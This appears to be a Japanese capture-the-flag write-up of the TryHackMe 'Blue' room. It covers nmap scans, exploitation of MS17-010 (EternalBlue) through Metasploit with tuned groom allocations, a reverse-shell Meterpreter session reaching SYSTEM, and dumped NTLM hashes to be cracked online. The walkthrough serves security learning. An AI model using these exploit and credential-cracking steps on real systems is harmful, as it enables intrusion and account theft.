![](https://raw.githubusercontent.com/crum7/Obsidian/main/TryHackMe_Memo/Machine/images/Generic-Banner.svg)

- URL : https://tryhackme.com/r/room/blue
- #easy 
- OS :  #Windows
- Machine Author(s): 
- Hack Date: 2025-01-02,20:15


# Enumeration
どのポートが空いている?
```bash
PORT      STATE SERVICE            REASON          VERSION
135/tcp   open  msrpc              syn-ack ttl 128 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 128 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 128 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 128
|_ssl-date: 2025-01-02T11:03:22+00:00; -1s from scanner time.
49152/tcp open  msrpc              syn-ack ttl 128 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 128 Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack ttl 128 Microsoft Windows RPC
49158/tcp open  msrpc              syn-ack ttl 128 Microsoft Windows RPC
49159/tcp open  msrpc              syn-ack ttl 128 Microsoft Windows RPC
MAC Address: 02:83:7C:C9:21:C9 (Unknown)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h29m59s, deviation: 3h00m00s, median: -1s
| nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:83:7c:c9:21:c9 (unknown)
| Names:
|   JON-PC<00>           Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   JON-PC<20>           Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   02 83 7c c9 21 c9 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 53248/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 58458/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 11980/udp): CLEAN (Timeout)
|   Check 4 (port 57286/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-01-02T05:03:17-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-01-02T11:03:17
|_  start_date: 2025-01-02T10:58:51
```


nmapで脆弱性スキャン
ms17-010が見つかった。

ms17-010
- MSから始まる番号（例: MS17-010）は、**Microsoft Security Bulletinのセキュリティパッチの識別番号
- MS17-010
	- 意味
		- **MS**: Microsoft Security Bulletinの略
		- **17**: 公開年（2017年）
		- 10番目のセキュリティパッチ
	- 内容
		- 2017年に発生した**WannaCry**ランサムウェア攻撃で利用された「EternalBlue」エクスプロイトの脆弱性
		- 攻撃者が特別に細工されたメッセージをSMBv1サーバーに送信することで、リモートでコードを実行できる可能性があります。
		- MS17-010で修正された主な脆弱性には、以下が含まれます：
			- **CVE-2017-0143**: Windows SMBのリモートコード実行の脆弱性
			- **CVE-2017-0144**: Windows SMBのリモートコード実行の脆弱性
			- **CVE-2017-0145**: Windows SMBのリモートコード実行の脆弱性
			- **CVE-2017-0146**: Windows SMBのリモートコード実行の脆弱性
			- **CVE-2017-0147**: Windows SMBの情報漏洩の脆弱性
			- **CVE-2017-0148**: Windows SMBのリモートコード実行の脆弱性



```bash
oot@ip-10-10-195-190:~/HTBScript# nmap --script=*vuln* 10.10.154.44
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-02 11:12 GMT
Nmap scan report for 10.10.154.44.htb (10.10.154.44)
Host is up (0.032s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown
MAC Address: 02:83:7C:C9:21:C9 (Unknown)

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 91.73 seconds
```




# Foothold

meterplaterでEternalBlueの脆弱性を使ってexploitした。
EternalBlueは、「Groom Allocations」とは、メモリヒープ（heap）の管理を操作して、ターゲットシステムの脆弱性を悪用している。
具体的には、脆弱性を引き起こす条件を満たすように、ヒープメモリを意図的に配置・解放する。そのため、たまに上手くいかなくなることがある。
自分は、`set GroomAllocations 20`にしたら、上手く行った。
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 10.10.195.190:4444 
[*] 10.10.154.44:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.154.44:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.154.44:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.154.44:445 - The target is vulnerable.
[*] 10.10.154.44:445 - Connecting to target for exploitation.
[+] 10.10.154.44:445 - Connection established for exploitation.
[+] 10.10.154.44:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.154.44:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.154.44:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.154.44:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.154.44:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.154.44:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.154.44:445 - Trying exploit with 20 Groom Allocations.
[*] 10.10.154.44:445 - Sending all but last fragment of exploit packet
[*] 10.10.154.44:445 - Starting non-paged pool grooming
[+] 10.10.154.44:445 - Sending SMBv2 buffers
[+] 10.10.154.44:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.154.44:445 - Sending final SMBv2 buffers.
[*] 10.10.154.44:445 - Sending last fragment of exploit packet!
[*] 10.10.154.44:445 - Receiving response from exploit packet
[+] 10.10.154.44:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.154.44:445 - Sending egg to corrupted connection.
[*] 10.10.154.44:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 10.10.154.44
[*] Meterpreter session 1 opened (10.10.195.190:4444 -> 10.10.154.44:49219) at 2025-01-02 11:40:53 +0000
[+] 10.10.154.44:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.154.44:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.154.44:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > bash
[-] Unknown command: bash. Run the help command for more details.
meterpreter > shell
Process 1112 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```

## Notes
なんか、他のアカウントのパスワードも知りたいらしい。
Windowsのパスワードのハッシュの構成

`<ユーザー名>:<RID>:<LMハッシュ>:<NTLMハッシュ>:::`

- **ユーザー名**: Windowsアカウント名
- **RID**: 相対識別子（ユーザー固有ID）
- **LMハッシュ**: 古いLAN Managerハッシュ（未使用の場合は`aad3b435b51404eeaad3b435b51404ee`）
- **NTLMハッシュ**: NTLMv1またはv2ハッシュ（クラック対象）

jonのパスワードを知るためには、一番最後のffb43f0de35be4d9917ac0cc8ad57f8dの部分を
https://crackstation.net/
でクラックすればいい。
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

```

![](https://raw.githubusercontent.com/crum7/Obsidian/main/TryHackMe_Memo/Machine/images/Pasted%20image%2020250102210525.png)


## Flags

- **User**: `<md5>`
- **Root**: `<md5>`
